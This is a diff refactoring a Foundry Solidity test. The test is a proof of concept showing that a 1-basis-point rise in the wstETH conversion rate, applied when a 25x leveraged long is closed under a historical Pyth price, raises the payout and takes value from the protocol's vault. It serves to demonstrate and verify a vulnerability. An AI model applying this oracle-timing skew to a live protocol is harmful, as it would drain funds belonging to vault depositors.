@@ -37,6 +37,12 @@ jobs:
               uint256 private constant LIVE_MAX_LEVERAGE = 25_000 ether; // leverage has 21 decimals: 25e21
               uint16 private constant LIVE_POSITION_FEE_BPS = 2;
 
+              struct Result {
+                  uint256 payout;
+                  uint256 vault;
+                  uint64 pythTimestamp;
+              }
+
               MockPyth private pyth;
               MockChainlinkOnChain private chainlink;
               WstEthOracleMiddlewareWithPyth private realOracle;
@@ -45,17 +51,15 @@ jobs:
 
               function setUp() public {
                   SetUpParams memory setupParams = DEFAULT_PARAMS;
-                  setupParams.initialDeposit = 100 ether; // ample vault backing for the controlled high-leverage position
+                  setupParams.initialDeposit = 100 ether;
                   setupParams.flags.enablePositionFees = true;
                   super._setUp(setupParams);
 
-                  // Match current mainnet parameters relevant to the exploit.
                   vm.startPrank(managers.setProtocolParamsManager);
                   protocol.setMaxLeverage(LIVE_MAX_LEVERAGE);
                   protocol.setPositionFeeBps(LIVE_POSITION_FEE_BPS);
                   vm.stopPrank();
 
-                  // Target ~25x: leverage ~= P/(P-L), so L ~= 96% of P.
                   posId = setUpUserPositionInLong(
                       OpenParams({
                           user: address(this),
@@ -65,11 +69,9 @@ jobs:
                           price: params.initialPrice
                       })
                   );
-
                   (Position memory pos,) = protocol.getLongPosition(posId);
                   totalExpo = pos.totalExpo;
 
-                  // Replace only the oracle with the production-class ETH/USD × current stEthPerToken middleware.
                   pyth = new MockPyth();
                   chainlink = new MockChainlinkOnChain();
                   realOracle = new WstEthOracleMiddlewareWithPyth(
@@ -77,6 +79,17 @@ jobs:
                   );
                   vm.prank(managers.setExternalManager);
                   protocol.setOracleMiddleware(realOracle);
+              }
+
+              function _validate(uint256 fee) internal returns (Result memory r) {
+                  uint256 beforeBalance = wstETH.balanceOf(address(this));
+                  LongActionOutcome outcome = protocol.validateClosePosition{ value: fee }(
+                      payable(address(this)), MOCK_PYTH_DATA, EMPTY_PREVIOUS_DATA
+                  );
+                  assertEq(uint8(outcome), uint8(LongActionOutcome.Processed), "close not processed");
+                  r.payout = wstETH.balanceOf(address(this)) - beforeBalance;
+                  r.vault = protocol.getBalanceVault();
+                  r.pythTimestamp = pyth.lastPublishTime();
               }
 
               function test_live25xSameHistoricalEthPricePostRebasePaysMoreAndLeavesVaultLess() public {
@@ -97,52 +110,32 @@ jobs:
                   skip(realOracle.getValidationDelay() + 1);
                   uint256 fee = realOracle.validationCost(MOCK_PYTH_DATA, ProtocolAction.ValidateClosePosition);
                   uint256 snap = vm.snapshotState();
-
-                  uint256 userBeforeControl = wstETH.balanceOf(address(this));
-                  LongActionOutcome controlOutcome = protocol.validateClosePosition{ value: fee }(
-                      payable(address(this)), MOCK_PYTH_DATA, EMPTY_PREVIOUS_DATA
-                  );
-                  uint256 payoutControl = wstETH.balanceOf(address(this)) - userBeforeControl;
-                  uint256 vaultControl = protocol.getBalanceVault();
-                  uint64 pythTimestampControl = pyth.lastPublishTime();
-                  assertEq(uint8(controlOutcome), uint8(LongActionOutcome.Processed), "control close not processed");
+                  Result memory control = _validate(fee);
 
                   assertTrue(vm.revertToState(snap), "snapshot revert failed");
 
-                  // Only change the execution-time Lido conversion rate by +1 bp.
                   uint256 rateAfter = rateBefore + rateBefore / 10_000;
                   vm.mockCall(address(wstETH), abi.encodeWithSignature("stEthPerToken()"), abi.encode(rateAfter));
+                  Result memory skew = _validate(fee);
 
-                  uint256 userBeforeSkew = wstETH.balanceOf(address(this));
-                  LongActionOutcome skewOutcome = protocol.validateClosePosition{ value: fee }(
-                      payable(address(this)), MOCK_PYTH_DATA, EMPTY_PREVIOUS_DATA
-                  );
-                  uint256 payoutSkew = wstETH.balanceOf(address(this)) - userBeforeSkew;
-                  uint256 vaultSkew = protocol.getBalanceVault();
-                  uint64 pythTimestampSkew = pyth.lastPublishTime();
-                  assertEq(uint8(skewOutcome), uint8(LongActionOutcome.Processed), "skewed close not processed");
-
-                  assertEq(pythTimestampSkew, pythTimestampControl, "historical ETH report timestamp changed");
-                  assertGt(payoutSkew, payoutControl, "post-T+24 rate did not increase close payout");
-                  assertLt(vaultSkew, vaultControl, "post-T+24 rate did not reduce vault-side value");
-
-                  uint256 payoutDelta = payoutSkew - payoutControl;
-                  uint256 vaultDelta = vaultControl - vaultSkew;
+                  assertEq(skew.pythTimestamp, control.pythTimestamp, "historical ETH report timestamp changed");
+                  assertGt(skew.payout, control.payout, "post-T+24 rate did not increase close payout");
+                  assertLt(skew.vault, control.vault, "post-T+24 rate did not reduce vault-side value");
 
                   emit log_named_uint("position_amount", POSITION_AMOUNT);
                   emit log_named_uint("position_total_expo", totalExpo);
                   emit log_named_uint("realized_leverage_x1e18", uint256(totalExpo) * 1 ether / POSITION_AMOUNT);
                   emit log_named_uint("position_fee_bps", protocol.getPositionFeeBps());
-                  emit log_named_uint("pyth_timestamp_both_runs", pythTimestampControl);
+                  emit log_named_uint("pyth_timestamp_both_runs", control.pythTimestamp);
                   emit log_named_uint("rate_before", rateBefore);
                   emit log_named_uint("rate_after", rateAfter);
-                  emit log_named_uint("payout_control", payoutControl);
-                  emit log_named_uint("payout_skew", payoutSkew);
-                  emit log_named_uint("payout_delta", payoutDelta);
-                  emit log_named_uint("payout_delta_bps_of_collateral", payoutDelta * 10_000 / POSITION_AMOUNT);
-                  emit log_named_uint("vault_control", vaultControl);
-                  emit log_named_uint("vault_skew", vaultSkew);
-                  emit log_named_uint("vault_value_lost", vaultDelta);
+                  emit log_named_uint("payout_control", control.payout);
+                  emit log_named_uint("payout_skew", skew.payout);
+                  emit log_named_uint("payout_delta", skew.payout - control.payout);
+                  emit log_named_uint("payout_delta_bps_of_collateral", (skew.payout - control.payout) * 10_000 / POSITION_AMOUNT);
+                  emit log_named_uint("vault_control", control.vault);
+                  emit log_named_uint("vault_skew", skew.vault);
+                  emit log_named_uint("vault_value_lost", control.vault - skew.vault);
                   emit log_named_uint("oracle_validation_fee_wei", fee);
               }
           }
